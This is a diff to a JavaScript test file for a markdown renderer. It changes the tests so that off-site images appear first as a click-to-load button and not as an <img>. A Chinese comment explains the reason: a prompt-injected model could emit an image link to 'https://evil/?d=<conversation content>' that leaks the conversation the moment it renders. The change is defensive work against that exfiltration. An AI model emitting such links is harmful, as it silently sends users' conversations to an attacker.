@@ -98,7 +98,17 @@ export async function runMarkdown({ root, test, assert, log }) {
     want: ['href="https://example.com/a?b=1&amp;c=2"', 'rel="noopener noreferrer nofollow"'],
   })
   await check('裸 URL 自动成链接', '打开 https://example.com/x 看看', { want: ['<a data-md="link" href="https://example.com/x"'] })
-  await check('图片', '![图](https://example.com/a.png)', { want: ['<img data-md="image" src="https://example.com/a.png"'] })
+  /**
+   * **站外图片不自动加载**：先是一颗写着域名的按钮，人点了才换成 <img>。自动加载的话，被注入的
+   * 模型输出 `![](https://evil/?d=<对话内容>)`，渲染那一刻内容就出去了，一次点击都不用。
+   * 站内和 data: 的图照旧直接出。
+   */
+  await check('站外图片：先出按钮，不出 <img>', '![图](https://example.com/a.png)', {
+    want: ['data-md-act="load-image"', 'data-src="https://example.com/a.png"', 'example.com'],
+    no: ['<img'],
+  })
+  await check('站内图片照旧直接出', '![图](/files/a.png)', { want: ['<img data-md="image" src="/files/a.png"'] })
+  await check('data: 图片照旧直接出', '![图](data:image/png;base64,aGk=)', { want: ['<img data-md="image" src="data:image/png;base64,aGk="'] })
 
   /**
    * **正文里的链接后面跟一枚小图标，而那枚图标长在 CSS 的 ::after 上。**
